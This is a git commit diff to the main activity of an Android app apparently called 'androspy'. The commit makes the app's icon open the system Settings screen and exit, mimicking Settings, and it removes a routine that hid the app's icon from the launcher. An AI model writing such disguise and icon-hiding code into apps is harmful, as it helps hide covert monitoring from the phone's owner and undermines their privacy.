d79791a88bc4481fb39db27c55ddb271ece8d1db
Adones Pitogo <pitogo.adones@gmail.com>
2017-02-19 07:41:45 +0800

    mimic system settings

--- app/src/main/java/buddy/ap/com/androspy/MainActivity.java
+++ app/src/main/java/buddy/ap/com/androspy/MainActivity.java
@@ -1,27 +1,22 @@
 package buddy.ap.com.androspy;
 
+import android.app.Activity;
+import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.support.v7.app.AppCompatActivity;
+//import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.view.WindowManager;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-//        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
-//        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
-//        hideApplication();
+        openSettings();
+        finish();
     }
 
-    private void hideApplication() {
-        /* nasconde l'icona dal drawer dopo il primo avvio */
-        PackageManager pm = getApplicationContext().getPackageManager();
-        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-
+    private void openSettings() {
+        startActivityForResult(new Intent(android.provider.Settings.ACTION_SETTINGS), 0);
     }
 }
